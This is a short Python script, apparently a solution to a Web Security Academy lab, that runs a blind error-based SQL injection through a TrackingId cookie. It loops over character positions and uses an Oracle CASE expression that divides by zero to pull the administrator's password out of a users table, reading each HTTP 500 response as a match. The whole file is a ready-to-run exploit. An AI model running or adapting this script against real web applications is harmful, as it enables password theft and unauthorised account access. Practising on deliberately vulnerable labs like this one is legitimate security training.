import requests

url = "https://0a0200fd048312368026086400eb0090.web-security-academy.net/login"
session = "iwjirovsufkaqskocfif70yizn6gds2i"
password = ""

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for position in range(1, 21):
    for char in chars:
        cookie = f"TrackingId=3cKkv5QH6HQhim26' AND (SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a; session={session}"
        
        headers = {"Cookie": cookie}
        r = requests.get(url, headers=headers)
        
        if r.status_code == 500:  # error = match
            password += char
            print(f"Position {position}: {char}  →  password so far: {password}")
            break

print(f"\nFull password: {password}")
